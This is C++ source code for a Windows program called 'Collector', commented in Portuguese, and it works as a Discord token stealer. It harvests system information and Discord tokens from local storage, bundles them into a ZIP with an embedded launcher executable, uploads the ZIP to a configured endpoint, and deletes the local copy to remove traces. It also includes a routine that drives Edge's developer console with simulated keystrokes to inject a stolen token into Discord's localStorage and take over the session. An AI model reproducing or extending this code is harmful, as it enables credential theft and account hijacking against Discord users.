#include "pch.h"
#include "zip_writer.h"
#include "sysinfo.h"
#include "discord.h"
#include "endpoint.h"
#include <winhttp.h>

// ── POST do ZIP para o servidor local ─────────────────────────────────────────
static bool post_zip_to_server(const char* endpoint, const char* zip_filename) {
    // Lê o ZIP do disco
    HANDLE hf = CreateFileA(zip_filename, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER fsize = {}; GetFileSizeEx(hf, &fsize);
    std::vector<uint8_t> zip_data((size_t)fsize.QuadPart);
    DWORD rd = 0;
    ReadFile(hf, zip_data.data(), (DWORD)fsize.QuadPart, &rd, nullptr);
    CloseHandle(hf);

    // Parse URL: http(s)://host:porta/path
    std::string url(endpoint);
    bool use_ssl = false;
    if (url.substr(0, 8) == "https://") { use_ssl = true;  url = url.substr(8); }
    else if (url.substr(0, 7) == "http://")             { url = url.substr(7); }

    size_t slash = url.find('/');
    std::string host_port = (slash != std::string::npos) ? url.substr(0, slash) : url;
    std::string path      = (slash != std::string::npos) ? url.substr(slash)    : "/";

    INTERNET_PORT port = use_ssl ? 443 : 80;
    std::string host_str = host_port;
    size_t colon = host_port.rfind(':');
    if (colon != std::string::npos) {
        host_str = host_port.substr(0, colon);
        port     = (INTERNET_PORT)std::stoi(host_port.substr(colon + 1));
    }
    std::wstring whost(host_str.begin(), host_str.end());
    std::wstring wpath(path.begin(), path.end());

    // Monta corpo multipart/form-data
    const std::string boundary = "----collector7a3f";
    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"";
    body += zip_filename;
    body += "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
    body.insert(body.end(), zip_data.begin(), zip_data.end());
    body += "\r\n--" + boundary + "--\r\n";

    std::string ct = "multipart/form-data; boundary=" + boundary;
    std::wstring wct(ct.begin(), ct.end());

    // WinHTTP
    HINTERNET hSess = WinHttpOpen(L"collector/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
    if (!hSess) return false;

    WinHttpSetTimeouts(hSess, 10000, 10000, 10000, 10000);

    HINTERNET hConn = WinHttpConnect(hSess, whost.c_str(), port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return false; }

    DWORD req_flags = use_ssl ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, req_flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return false; }

    std::wstring ct_header = L"Content-Type: " + wct;
    WinHttpAddRequestHeaders(hReq, ct_header.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hReq, nullptr);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return ok != FALSE;
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers de injecao de token via Edge
// ─────────────────────────────────────────────────────────────────────────────

static std::wstring get_edge_path() {
    const std::wstring paths[] = {
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
    };
    for (auto& p : paths)
        if (GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES) return p;
    wchar_t buf[MAX_PATH] = {};
    ExpandEnvironmentStringsW(
        L"%LOCALAPPDATA%\\Microsoft\\Edge\\Application\\msedge.exe", buf, MAX_PATH);
    if (GetFileAttributesW(buf) != INVALID_FILE_ATTRIBUTES) return buf;
    return {};
}

static void kill_edge() {
    SHELLEXECUTEINFOA si = { sizeof(si) };
    si.fMask = SEE_MASK_NOCLOSEPROCESS;
    si.lpVerb = "open";
    si.lpFile = "taskkill";
    si.lpParameters = "/F /IM msedge.exe /T";
    si.nShow = SW_HIDE;
    if (ShellExecuteExA(&si) && si.hProcess) {
        WaitForSingleObject(si.hProcess, 4000);
        CloseHandle(si.hProcess);
    }
    Sleep(1500);
}

struct EdgeFindCtx { HWND hwnd; };
static BOOL CALLBACK _find_edge_cb(HWND hwnd, LPARAM lp) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    wchar_t cls[128] = {};
    GetClassNameW(hwnd, cls, 128);
    if (wcscmp(cls, L"Chrome_WidgetWin_1") == 0) {
        wchar_t title[256] = {};
        GetWindowTextW(hwnd, title, 256);
        ((EdgeFindCtx*)lp)->hwnd = hwnd;
        return FALSE;
    }
    return TRUE;
}
static HWND find_edge_hwnd(int timeout_ms = 12000) {
    DWORD t0 = GetTickCount();
    while ((int)(GetTickCount() - t0) < timeout_ms) {
        EdgeFindCtx ctx = {};
        EnumWindows(_find_edge_cb, (LPARAM)&ctx);
        if (ctx.hwnd) return ctx.hwnd;
        Sleep(400);
    }
    return nullptr;
}

static void send_vk(WORD vk) {
    INPUT inp[2] = {};
    inp[0].type = INPUT_KEYBOARD; inp[0].ki.wVk = vk;
    inp[1].type = INPUT_KEYBOARD; inp[1].ki.wVk = vk; inp[1].ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(2, inp, sizeof(INPUT)); Sleep(80);
}
static void type_wstr(const std::wstring& text) {
    for (wchar_t c : text) {
        INPUT inp[2] = {};
        inp[0].type = INPUT_KEYBOARD; inp[0].ki.wScan = c; inp[0].ki.dwFlags = KEYEVENTF_UNICODE;
        inp[1].type = INPUT_KEYBOARD; inp[1].ki.wScan = c; inp[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(2, inp, sizeof(INPUT)); Sleep(8);
    }
}

static bool inject_token_in_edge(const std::string& token) {
    std::wstring edge = get_edge_path();
    if (edge.empty()) return false;

    std::wstring cmdline = L"\"" + edge + L"\" https://discord.com";
    std::vector<wchar_t> cmd(cmdline.begin(), cmdline.end()); cmd.push_back(0);
    STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
        return false;
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    // Encontra janela do Edge e traz para frente
    HWND hwnd = find_edge_hwnd(12000);
    if (hwnd) { ShowWindow(hwnd, SW_RESTORE); SetForegroundWindow(hwnd); BringWindowToTop(hwnd); }
    Sleep(5000); // Discord carrega
    if (hwnd) { SetForegroundWindow(hwnd); BringWindowToTop(hwnd); Sleep(300); }

    // F12 → DevTools
    send_vk(VK_F12);
    Sleep(3000);

    // Digita o JS no console
    std::wstring tok(token.begin(), token.end());
    std::wstring js =
        L"setInterval(()=>{document.body.appendChild(document.createElement('iframe'))"
        L".contentWindow.localStorage.token='\"" + tok + L"\"'},50);"
        L"setTimeout(()=>{location.reload();},2500);";
    type_wstr(js);
    send_vk(VK_RETURN);
    return true;
}

int main(int argc, char* argv[]) {
    // Modo diagnostico: collector.exe --diagnose
    bool diagnose = (argc > 1 && strcmp(argv[1], "--diagnose") == 0);

    if (diagnose) {
        if (AttachConsole(ATTACH_PARENT_PROCESS)) {
            FILE* fp = nullptr;
            freopen_s(&fp, "CONOUT$", "w", stdout);
            freopen_s(&fp, "CONOUT$", "w", stderr);
            freopen_s(&fp, "CONIN$", "r", stdin);
            std::ios::sync_with_stdio(true);
        }
        SetConsoleOutputCP(CP_UTF8);
    }

    std::cout << "========================================\n";
    std::cout << (diagnose ? "  Collector v1.0  [MODO DIAGNOSTICO]\n"
                           : "  Collector v1.0\n");
    std::cout << "========================================\n\n";

    if (diagnose) {
        std::cout << "[*] Executando diagnostico dos arquivos leveldb...\n";
        collect_discord_tokens(true);
        std::cout << "\n[*] Diagnostico concluido. Pressione Enter...\n";
        std::cin.get();
        return 0;
    }

    // ── Coleta normal ─────────────────────────────────────────────────────────
    std::cout << "[*] Coletando informacoes do sistema...\n";
    auto sysinfo   = collect_sysinfo();
    std::string sys_text = sysinfo_to_text(sysinfo);
    std::cout << sys_text << "\n";

    std::cout << "[*] Coletando tokens do Discord...\n";
    auto tokens    = collect_discord_tokens(false);
    std::string disc_text = discord_to_text(tokens);
    std::cout << disc_text << "\n";

    std::cout << "[*] Gerando ZIP...\n";
    ZipWriter zip;
    zip.add_file("sysinfo.txt", sys_text);
    zip.add_file("discord.txt", disc_text);

    // Inclui o launcher a partir do recurso embutido no proprio exe
    {
        HRSRC   hRes  = FindResourceA(nullptr, MAKEINTRESOURCEA(101), RT_RCDATA);
        HGLOBAL hGlob = hRes ? LoadResource(nullptr, hRes) : nullptr;
        void*   pData = hGlob ? LockResource(hGlob) : nullptr;
        DWORD   size  = hRes  ? SizeofResource(nullptr, hRes) : 0;
        if (pData && size > 0) {
            std::vector<uint8_t> ldata((uint8_t*)pData, (uint8_t*)pData + size);
            zip.add_file("discord_launcher.exe", ldata);
            std::cout << "[*] discord_launcher.exe incluido no ZIP (recurso embutido)\n";
        } else {
            // Fallback: tenta ler do disco
            HANDLE h = CreateFileW(L"discord_launcher.exe", GENERIC_READ,
                FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (h != INVALID_HANDLE_VALUE) {
                LARGE_INTEGER sz = {}; GetFileSizeEx(h, &sz);
                std::vector<uint8_t> ldata((size_t)sz.QuadPart);
                DWORD rd = 0;
                ReadFile(h, ldata.data(), (DWORD)sz.QuadPart, &rd, nullptr);
                CloseHandle(h); ldata.resize(rd);
                zip.add_file("discord_launcher.exe", ldata);
                std::cout << "[*] discord_launcher.exe incluido no ZIP (disco)\n";
            } else {
                std::cout << "[!] discord_launcher.exe nao encontrado\n";
            }
        }
    }

    SYSTEMTIME st;
    GetLocalTime(&st);
    char zip_name[64];
    sprintf_s(zip_name, "collector_%04d%02d%02d_%02d%02d%02d.zip",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    if (zip.save(zip_name)) {
        std::cout << "[OK] ZIP salvo: " << zip_name << "\n";
        std::cout << "[*] Enviando para " << COLLECTOR_ENDPOINT << " ...\n";
        if (post_zip_to_server(COLLECTOR_ENDPOINT, zip_name)) {
            std::cout << "[OK] ZIP enviado com sucesso!\n";
            DeleteFileA(zip_name); // remove rastro local
        } else {
            std::cout << "[!] Falha ao enviar. ZIP salvo localmente.\n";
        }
    } else {
        std::cout << "[ERRO] Falha ao salvar ZIP.\n";
    }
    if (diagnose) {
        std::cout << "\n[*] Pressione Enter para sair...\n";
        std::cin.get();
    }
    return 0;
}
